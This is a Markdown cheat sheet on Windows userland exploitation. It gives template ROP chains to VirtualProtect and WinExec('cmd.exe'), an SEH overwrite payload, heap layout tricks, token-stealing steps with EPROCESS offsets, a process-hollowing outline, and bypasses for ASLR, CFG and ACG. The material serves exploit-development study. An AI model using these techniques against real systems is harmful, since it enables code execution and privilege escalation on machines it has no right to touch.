# Windows Userland Exploitation

## Stack Buffer Overflow

### With DEP + ASLR (ROP to VirtualProtect)
```python
from pwn import *

# Typical Windows ROP chain: VirtualProtect to make stack executable
# VirtualProtect(lpAddress, dwSize, flNewProtect, lpflOldProtect)
# flNewProtect = 0x40 (PAGE_EXECUTE_READWRITE)

# Find gadgets in non-ASLR module (if any) or leak module base first
# Common non-ASLR: old DLLs compiled without /DYNAMICBASE

rop_chain = b''
rop_chain += p32(virtualprotect_addr)  # return to VirtualProtect
rop_chain += p32(shellcode_addr)       # return after VirtualProtect → shellcode
rop_chain += p32(shellcode_addr)       # lpAddress
rop_chain += p32(0x1000)              # dwSize
rop_chain += p32(0x40)                # PAGE_EXECUTE_READWRITE
rop_chain += p32(writable_addr)       # lpflOldProtect (any writable addr)
```

### SEH Overwrite (32-bit, pre-SafeSEH)
```python
# Structured Exception Handler chain on stack
# Overflow → overwrite SEH handler → trigger exception → RIP control

# SEH record: [next_seh_record | handler_address]
# Strategy: overwrite handler with pop-pop-ret gadget
#           overwrite next_seh with short jmp to shellcode

payload = b'A' * seh_offset
payload += b'\xeb\x06\x90\x90'  # next_seh: short jmp +6 (over handler)
payload += p32(pop_pop_ret)      # handler: pop-pop-ret gadget
payload += shellcode             # lands here after jmp
```

### Return-Oriented Programming (x64 Windows)
```python
# Windows x64 calling convention: RCX, RDX, R8, R9 (first 4 args)
# Shadow space: 0x20 bytes reserved on stack before call

# ROP to WinExec("cmd.exe", 0)
rop = b''
rop += p64(pop_rcx)          # pop rcx; ret
rop += p64(cmd_string_addr)  # "cmd.exe"
rop += p64(pop_rdx)          # pop rdx; ret
rop += p64(0)                # uCmdShow = 0
rop += p64(winexec_addr)     # WinExec
```

## Heap Exploitation (Windows Heap)

### Segment Heap (Windows 10 19H1+)
```
# Modern Windows uses Segment Heap for system processes
# Key structures: _SEGMENT_HEAP, _HEAP_VS_CONTEXT, _HEAP_LFH_CONTEXT
# Variable Size (VS) allocation for small blocks
# Low Fragmentation Heap (LFH) for frequent same-size allocations

# LFH is randomized — harder to predict placement
# VS backend: more predictable, used before LFH activates
# LFH activates after 17+ allocations of same size (heuristic)
```

### NT Heap (Legacy / Non-Segment)
```python
# Linked list unlink exploitation (historical, mostly patched)
# Modern: metadata encoding, guard pages, heap cookies

# Practical approach: corrupt application-level structures on heap
# Target: C++ objects with vtables, std::string/vector internal pointers
# Overflow into adjacent object → overwrite vtable pointer → control RIP
```

### LFH Determinism Bypass
```python
# LFH randomizes within a bucket — but you can influence layout:
# 1. Spray to fill current LFH subsegment
# 2. Trigger new subsegment allocation (sequential within subsegment)
# 3. Allocate target + victim adjacently in new subsegment

# Alternatively: use VS backend (allocate sizes that don't trigger LFH)
# Or: exhaust LFH for target size → fall back to VS backend
```

## Type Confusion

### COM Object Type Confusion
```cpp
// Pattern: QueryInterface returns wrong type, or variant type mismatch
// IUnknown* → cast to wrong interface → vtable offset mismatch
// Method call at wrong vtable offset → controlled function pointer

// Exploit:
// 1. Create object of type A
// 2. Trigger code path that treats it as type B
// 3. Virtual call uses wrong vtable offset → attacker-controlled address
```

### JavaScript Engine (Chakra/V8 on Windows)
```javascript
// Type confusion in JIT-compiled code
// Compiler assumes type A, runtime provides type B
// Leads to: OOB array access, fake object creation

// Pattern: confuse array type (int32 vs float64 vs object)
// int32 array treated as float64 → read/write beyond bounds
// Object array treated as int32 → leak object addresses
```

## Token Manipulation (Privilege Escalation)

### Token Stealing
```c
// After arbitrary write primitive:
// 1. Find current process EPROCESS
// 2. Find SYSTEM process EPROCESS (PID 4)
// 3. Copy SYSTEM token to current process

// EPROCESS offsets (version-specific):
// +0x4b8: Token (Win10 21H2)
// +0x440: UniqueProcessId
// +0x448: ActiveProcessLinks (linked list)

// Walk ActiveProcessLinks to find PID 4, copy its Token field
```

### Token Privilege Adjustment
```c
// If you can write to your own token:
// Enable SeDebugPrivilege, SeImpersonatePrivilege, etc.
// Token.Privileges bitmap at known offset

// Potato attacks (service account → SYSTEM):
// SeImpersonatePrivilege → create named pipe → impersonate connecting SYSTEM token
```

## DLL Injection / Hollowing

### Process Hollowing
```python
# 1. Create suspended process (legitimate binary)
# 2. Unmap original image
# 3. Allocate + write malicious PE at same base
# 4. Fix entry point in thread context
# 5. Resume thread

import ctypes
from ctypes import wintypes

kernel32 = ctypes.WinDLL('kernel32')
ntdll = ctypes.WinDLL('ntdll')

# CreateProcess with CREATE_SUSPENDED (0x4)
# NtUnmapViewOfSection(hProcess, imageBase)
# VirtualAllocEx + WriteProcessMemory (new PE)
# SetThreadContext (new entry point)
# ResumeThread
```

## Bypass Techniques

### ASLR Bypass
```
# Strategies:
# 1. Non-ASLR module (compiled without /DYNAMICBASE) — use as gadget source
# 2. Info leak: format string, uninitialized memory, partial overwrite
# 3. Heap spray: predictable heap addresses for large allocations
# 4. Low-entropy brute force (32-bit: only 8 bits of randomization for DLLs)
# 5. SharedUserData (0x7ffe0000): fixed address, contains some useful data
```

### CFG (Control Flow Guard) Bypass
```
# CFG validates indirect call targets against bitmap
# Valid targets: function entry points marked in bitmap

# Bypasses:
# 1. Call valid-but-useful function (e.g., VirtualProtect, LoadLibrary)
# 2. Corrupt CFG bitmap (if you have arbitrary write to ntdll region)
# 3. JIT pages (not CFG-protected in some configurations)
# 4. Return addresses (CFG doesn't protect returns — use ROP)
# 5. Longjmp: setjmp/longjmp targets may be valid CFG targets
```

### ACG (Arbitrary Code Guard) Bypass
```
# ACG prevents: new executable pages, modifying existing code pages
# Cannot: VirtualProtect to RWX, VirtualAlloc with EXECUTE, WriteProcessMemory to code

# Bypasses:
# 1. Pure ROP (no shellcode needed)
# 2. Child process without ACG (CreateProcess)
# 3. Existing JIT pages (if JIT process is separate)
# 4. Shared memory with non-ACG process
# 5. Return-to-existing-code (chain existing functions)
```

## Tools

| Tool | Purpose |
|------|---------|
| WinDbg | Windows kernel/user debugging |
| x64dbg / x32dbg | User-mode debugger with GUI |
| mona.py (Immunity) | Exploit dev helper (gadgets, SEH, egghunter) |
| ROPgadget | Cross-platform gadget finder |
| Process Hacker | Process/memory inspection |
| PE-bear / CFF Explorer | PE analysis |
| API Monitor | API call tracing |
| !exploitable (WinDbg) | Crash exploitability assessment |
| checksec.py (Windows) | Check PE mitigations |

## Debugging Setup

```
# WinDbg kernel debugging (VM)
bcdedit /debug on
bcdedit /dbgsettings serial debugport:1 baudrate:115200

# WinDbg useful commands
!analyze -v          # Auto-analyze crash
!heap -stat          # Heap statistics
!heap -flt s <size>  # Find heap blocks of specific size
dt _EPROCESS @$proc  # Dump EPROCESS structure
!token -n            # Display current token
.formats <value>     # Show value in multiple formats
```
